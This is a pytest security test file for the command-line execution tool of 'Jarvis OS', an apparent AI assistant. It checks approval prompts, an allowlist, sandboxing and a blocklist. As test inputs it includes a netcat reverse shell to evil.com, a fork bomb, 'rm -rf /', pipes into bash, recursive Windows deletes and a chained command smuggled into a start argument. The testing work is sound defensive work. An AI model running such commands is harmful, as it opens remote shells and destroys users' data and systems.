# Copyright (C) 2026 Barthélemy Houot
# This file is part of Jarvis OS, licensed under the GNU AGPL-3.0-or-later.
# See the LICENSE file or <https://www.gnu.org/licenses/agpl-3.0.html>.

"""Tests de sécurité pour ExecuteCLITool — failles identifiées dans l'audit."""

from __future__ import annotations

import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from jarvis.capabilities.tools import cli as cli_mod
from jarvis.capabilities.tools.cli import (
    ExecuteCLITool,
    is_safe_windows_start,
    normalize_cli_parts,
)


@pytest.fixture()
def tool() -> ExecuteCLITool:
    return ExecuteCLITool()


# ── _requires_approval : vérifications unitaires sur binaire résolu ───────────


def test_requires_approval_osascript_short() -> None:
    assert ExecuteCLITool._requires_approval(["osascript", "-e", "beep"]) is True


def test_requires_approval_osascript_absolute() -> None:
    """/usr/bin/osascript doit être détecté via Path(...).name."""
    assert ExecuteCLITool._requires_approval(["/usr/bin/osascript", "-e", "beep"]) is True


def test_requires_approval_rm() -> None:
    assert ExecuteCLITool._requires_approval(["rm", "-f", "file.txt"]) is True


def test_requires_approval_sudo() -> None:
    assert ExecuteCLITool._requires_approval(["sudo", "ls"]) is True


def test_requires_approval_shutdown() -> None:
    assert ExecuteCLITool._requires_approval(["shutdown", "-h", "now"]) is True


def test_requires_approval_pmset() -> None:
    assert ExecuteCLITool._requires_approval(["pmset", "sleepnow"]) is True


def test_requires_approval_open_app_flag() -> None:
    """open -a <app> doit exiger approbation."""
    assert ExecuteCLITool._requires_approval(["open", "-a", "Safari"]) is True


def test_requires_approval_open_https_url() -> None:
    """open https://... doit exiger approbation."""
    assert ExecuteCLITool._requires_approval(["open", "https://evil.com"]) is True


def test_requires_approval_open_http_url() -> None:
    assert ExecuteCLITool._requires_approval(["open", "http://example.com"]) is True


def test_requires_approval_open_plain_file() -> None:
    """open <fichier local> ne nécessite pas d'approbation."""
    assert ExecuteCLITool._requires_approval(["open", "document.pdf"]) is False


def test_requires_approval_ffmpeg_safe() -> None:
    assert ExecuteCLITool._requires_approval(["ffmpeg", "-i", "in.mp4", "out.mp4"]) is False


def test_requires_approval_yt_dlp_safe() -> None:
    assert ExecuteCLITool._requires_approval(["yt-dlp", "https://example.com/video"]) is False


def test_requires_approval_sips_safe() -> None:
    assert ExecuteCLITool._requires_approval(["sips", "-z", "800", "600", "in.jpg"]) is False


def test_requires_approval_empty_parts() -> None:
    assert ExecuteCLITool._requires_approval([]) is False


# ── Faille 1 : osascript via execute() — jamais exécuté sans confirmed ────────


async def test_osascript_without_confirmed_awaits_approval(tool: ExecuteCLITool) -> None:
    """osascript sans confirmed=True doit demander confirmation, jamais s'exécuter."""
    result = await tool.execute(command="osascript -e 'do shell script \"rm -f /tmp/x\"'")
    assert not result.is_error
    assert "⚠️" in result.content
    assert "confirmation" in result.content.lower()


async def test_osascript_absolute_path_awaits_approval(tool: ExecuteCLITool) -> None:
    """/usr/bin/osascript (chemin absolu) est aussi attrapé sans confirmed."""
    result = await tool.execute(command="/usr/bin/osascript -e 'beep'")
    assert not result.is_error
    assert "⚠️" in result.content


async def test_osascript_confirmed_executes(
    tool: ExecuteCLITool,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """osascript avec confirmed=True est bien soumis à exécution (mocké)."""
    mock_settings = MagicMock()
    mock_settings.allow_unsandboxed_exec = False
    monkeypatch.setattr("jarvis.capabilities.tools.cli.settings", mock_settings)

    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"result", b""))
    mock_proc.returncode = 0

    with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=mock_proc)) as mock_exec:
        result = await tool.execute(command="osascript -e 'beep'", confirmed=True)

    assert mock_exec.called
    assert not result.is_error


# ── Faille 2 : binaire hors whitelist ────────────────────────────────────────


async def test_binary_not_whitelisted_curl(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command="curl https://evil.com")
    assert result.is_error
    assert "non autorisé" in result.content


async def test_binary_not_whitelisted_nc(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command="nc -e /bin/sh evil.com 4444")
    assert result.is_error
    assert "non autorisé" in result.content


async def test_binary_not_whitelisted_bash(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command="bash -c 'echo pwned'")
    assert result.is_error


# ── Faille 3 : commandes sensibles exigent confirmed=True ────────────────────


async def test_rm_requires_confirmed(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command="rm -f /tmp/testfile")
    assert not result.is_error
    assert "⚠️" in result.content


async def test_sudo_rejected_by_whitelist(tool: ExecuteCLITool) -> None:
    """sudo n'est pas dans CLI_WHITELIST — rejeté dès la vérification binaire.

    Encore plus sécurisé que l'approbation : sudo ne peut pas être exécuté même
    avec confirmed=True car l'escalade de privilèges est hors whitelist.
    """
    result = await tool.execute(command="sudo ls")
    assert result.is_error
    assert "non autorisé" in result.content


async def test_shutdown_requires_confirmed(tool: ExecuteCLITool) -> None:
    # shutdown est dans _EXEC_BLOCKED_RE ? Non — _EXEC_BLOCKED_RE n'a pas shutdown.
    # → attrapé par _requires_approval
    result = await tool.execute(command="shutdown -h now")
    assert not result.is_error
    assert "⚠️" in result.content


# ── Faille 4 : blocklist irréversible non contournable par confirmed ──────────


async def test_blocked_pipe_bash_with_confirmed(tool: ExecuteCLITool) -> None:
    """confirmed=True ne contourne PAS la blocklist irréversible (| bash)."""
    result = await tool.execute(command="git log | bash", confirmed=True)
    assert result.is_error
    assert "dangereux" in result.content.lower() or "refusé" in result.content.lower()


async def test_blocked_pipe_sh_with_confirmed(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command="cat file.txt | sh", confirmed=True)
    assert result.is_error


async def test_blocked_fork_bomb_with_confirmed(tool: ExecuteCLITool) -> None:
    """confirmed=True ne contourne PAS la blocklist (fork bomb)."""
    result = await tool.execute(command=":() { :|:& };:", confirmed=True)
    assert result.is_error


async def test_blocked_rm_rf_root_with_confirmed(tool: ExecuteCLITool) -> None:
    """confirmed=True ne contourne PAS rm -rf /."""
    result = await tool.execute(command="rm -rf /", confirmed=True)
    assert result.is_error


# ── Faille 5 : parsing strict — guillemets non fermés refusés ─────────────────


async def test_unparsable_unclosed_single_quote(tool: ExecuteCLITool) -> None:
    """Guillemet simple non fermé → refus, pas de split naïf."""
    result = await tool.execute(command="ffmpeg -i 'unclosed")
    assert result.is_error
    assert "parsable" in result.content.lower() or "guillemet" in result.content.lower()


async def test_unparsable_unclosed_double_quote(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command='sips -z 800 600 "file with space')
    assert result.is_error


async def test_unparsable_is_not_executed(tool: ExecuteCLITool) -> None:
    """Vérifie qu'aucun subprocess n'est lancé pour une commande non parsable."""
    with patch("asyncio.create_subprocess_exec") as mock_exec:
        await tool.execute(command="ffmpeg -i 'bad")
    mock_exec.assert_not_called()


# ── Faille 3 & 4 : sandbox actif par défaut ───────────────────────────────────


async def test_sandbox_active_by_default(
    tool: ExecuteCLITool,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """cwd confiné + env restreint actifs par défaut (allow_unsandboxed_exec=False)."""
    captured: dict = {}

    async def mock_exec(*args: object, **kwargs: object) -> MagicMock:
        captured.update(kwargs)
        proc = MagicMock()
        proc.communicate = AsyncMock(return_value=(b"done", b""))
        proc.returncode = 0
        return proc

    mock_settings = MagicMock()
    mock_settings.allow_unsandboxed_exec = False
    monkeypatch.setattr("jarvis.capabilities.tools.cli.settings", mock_settings)

    with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
        await tool.execute(command="ffmpeg -version")

    assert "cwd" in captured, "cwd doit être confiné en sandbox"
    assert "env" in captured, "env doit être restreint en sandbox"
    assert "PATH" in captured["env"]
    real_home = os.path.expanduser("~")
    assert captured["env"].get("HOME") != real_home, "HOME sandbox ≠ HOME réel"


async def test_sandbox_disabled_with_opt_in(
    tool: ExecuteCLITool,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """allow_unsandboxed_exec=True désactive le sandbox (pas de cwd/env injectés)."""
    captured: dict = {}

    async def mock_exec(*args: object, **kwargs: object) -> MagicMock:
        captured.update(kwargs)
        proc = MagicMock()
        proc.communicate = AsyncMock(return_value=(b"done", b""))
        proc.returncode = 0
        return proc

    mock_settings = MagicMock()
    mock_settings.allow_unsandboxed_exec = True
    monkeypatch.setattr("jarvis.capabilities.tools.cli.settings", mock_settings)

    with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
        await tool.execute(command="ffmpeg -version")

    assert "cwd" not in captured, "sans sandbox, cwd ne doit pas être forcé"
    assert "env" not in captured, "sans sandbox, env ne doit pas être restreint"


# ── Usage légitime : non bloqué, sandboxé ─────────────────────────────────────


async def _run_legit(
    tool: ExecuteCLITool,
    monkeypatch: pytest.MonkeyPatch,
    command: str,
    stdout: bytes = b"ok",
) -> None:
    """Utilitaire : vérifie qu'une commande légitime n'est pas bloquée."""
    mock_settings = MagicMock()
    mock_settings.allow_unsandboxed_exec = False
    monkeypatch.setattr("jarvis.capabilities.tools.cli.settings", mock_settings)

    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(stdout, b""))
    mock_proc.returncode = 0

    with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=mock_proc)):
        result = await tool.execute(command=command)

    assert not result.is_error, f"commande légitime bloquée : {command!r} → {result.content}"


async def test_legitimate_ffmpeg(tool: ExecuteCLITool, monkeypatch: pytest.MonkeyPatch) -> None:
    await _run_legit(tool, monkeypatch, "ffmpeg -version", b"ffmpeg version 6.0")


async def test_legitimate_sips(tool: ExecuteCLITool, monkeypatch: pytest.MonkeyPatch) -> None:
    await _run_legit(tool, monkeypatch, "sips -z 800 600 input.jpg --out output.jpg")


async def test_legitimate_yt_dlp(tool: ExecuteCLITool, monkeypatch: pytest.MonkeyPatch) -> None:
    await _run_legit(tool, monkeypatch, "yt-dlp -f mp4 https://example.com/video")


async def test_legitimate_git_log(tool: ExecuteCLITool, monkeypatch: pytest.MonkeyPatch) -> None:
    await _run_legit(tool, monkeypatch, "git log --oneline -5")


async def test_legitimate_convert(tool: ExecuteCLITool, monkeypatch: pytest.MonkeyPatch) -> None:
    await _run_legit(tool, monkeypatch, "convert input.png output.jpg")


# ── Windows : cmd / start ─────────────────────────────────────────────────────


def test_normalize_start_chrome() -> None:
    assert normalize_cli_parts(["start", "Chrome"]) == ["cmd", "/c", "start", "", "Chrome"]


def test_normalize_cmd_exe_to_cmd() -> None:
    assert normalize_cli_parts([r"C:\Windows\System32\cmd.exe", "/c", "start", "Discord"]) == [
        "cmd",
        "/c",
        "start",
        "Discord",
    ]


def test_safe_start_chrome() -> None:
    assert is_safe_windows_start(["cmd", "/c", "start", "", "Chrome"]) is True
    assert is_safe_windows_start(["cmd", "/c", "start", "Discord"]) is True


def test_unsafe_cmd_echo_requires_approval() -> None:
    assert ExecuteCLITool._requires_approval(["cmd", "/c", "echo", "hi"]) is True


def test_unsafe_cmd_quoted_blob() -> None:
    """cmd /c \"start x & del\" n'est PAS un start argv-séparé → approbation."""
    parts = ["cmd", "/c", "start chrome & del /f file"]
    assert is_safe_windows_start(parts) is False
    assert ExecuteCLITool._requires_approval(parts) is True


def test_start_url_requires_approval() -> None:
    assert is_safe_windows_start(["cmd", "/c", "start", "https://evil.com"]) is False
    assert ExecuteCLITool._requires_approval(["cmd", "/c", "start", "https://evil.com"]) is True


async def test_start_chrome_no_approval(
    tool: ExecuteCLITool,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    mock_settings = MagicMock()
    mock_settings.allow_unsandboxed_exec = False
    monkeypatch.setattr("jarvis.capabilities.tools.cli.settings", mock_settings)

    captured: dict = {}

    async def mock_exec(*args: object, **kwargs: object) -> MagicMock:
        captured["args"] = args
        captured.update(kwargs)
        proc = MagicMock()
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.returncode = 0
        return proc

    with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await tool.execute(command="start Chrome")

    assert not result.is_error
    assert "⚠️" not in result.content
    assert captured["args"][:4] == ("cmd", "/c", "start", "")
    assert captured["args"][4] == "Chrome"


async def test_cmd_generic_awaits_approval(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command="cmd /c echo hello")
    assert not result.is_error
    assert "⚠️" in result.content


async def test_cmd_del_s_blocked_even_confirmed(tool: ExecuteCLITool) -> None:
    result = await tool.execute(command="cmd /c del /s C:\\temp", confirmed=True)
    assert result.is_error
    assert "dangereux" in result.content.lower() or "refusé" in result.content.lower()


# ── Windows : résolution python (stub Microsoft Store) ────────────────────────

_FAKE_PYTHON = r"C:\RealPython\python.exe"


def test_resolve_python_binary(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli_mod, "_real_windows_python", lambda: _FAKE_PYTHON)
    assert cli_mod._resolve_python_tokens(["python", "script.py"]) == [_FAKE_PYTHON, "script.py"]
    assert cli_mod._resolve_python_tokens(["python3", "-V"]) == [_FAKE_PYTHON, "-V"]


def test_resolve_pip_to_python_m_pip(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli_mod, "_real_windows_python", lambda: _FAKE_PYTHON)
    assert cli_mod._resolve_python_tokens(["pip", "install", "pyautogui"]) == [
        _FAKE_PYTHON,
        "-m",
        "pip",
        "install",
        "pyautogui",
    ]


def test_resolve_python_inside_safe_start(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli_mod, "_real_windows_python", lambda: _FAKE_PYTHON)
    parts = ["cmd", "/c", "start", "", "python", "C:\\x\\s.py"]
    assert cli_mod._resolve_python_tokens(parts) == [
        "cmd",
        "/c",
        "start",
        "",
        _FAKE_PYTHON,
        "C:\\x\\s.py",
    ]


def test_resolve_python_noop_when_not_found(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli_mod, "_real_windows_python", lambda: None)
    assert cli_mod._resolve_python_tokens(["python", "script.py"]) == ["python", "script.py"]


def test_resolve_untouched_for_other_binaries(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli_mod, "_real_windows_python", lambda: _FAKE_PYTHON)
    assert cli_mod._resolve_python_tokens(["git", "status"]) == ["git", "status"]


def test_find_real_python_skips_windowsapps_stub(
    tmp_path: object,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from pathlib import Path as _P

    stub_dir = _P(str(tmp_path)) / "Microsoft" / "WindowsApps"
    real_dir = _P(str(tmp_path)) / "RealPython"
    stub_dir.mkdir(parents=True)
    real_dir.mkdir(parents=True)
    (stub_dir / "python.exe").write_bytes(b"stub")
    (real_dir / "python.exe").write_bytes(b"real")

    monkeypatch.setenv("PATH", os.pathsep.join([str(stub_dir), str(real_dir)]))
    assert cli_mod._find_real_windows_python() == str(real_dir / "python.exe")


async def test_execute_resolved_python_passes_whitelist(
    tool: ExecuteCLITool,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`python x.py` résolu en chemin complet doit rester whitelisté (stem check)."""
    monkeypatch.setattr(cli_mod, "_real_windows_python", lambda: _FAKE_PYTHON)
    monkeypatch.setattr(cli_mod.sys, "platform", "win32")

    captured: dict = {}

    async def mock_exec(*args: object, **kwargs: object) -> MagicMock:
        captured["args"] = args
        proc = MagicMock()
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.returncode = 0
        return proc

    with patch("asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await tool.execute(command="python C:\\x\\script.py")

    assert not result.is_error
    assert "non autorisé" not in result.content
    assert captured["args"][0] == _FAKE_PYTHON
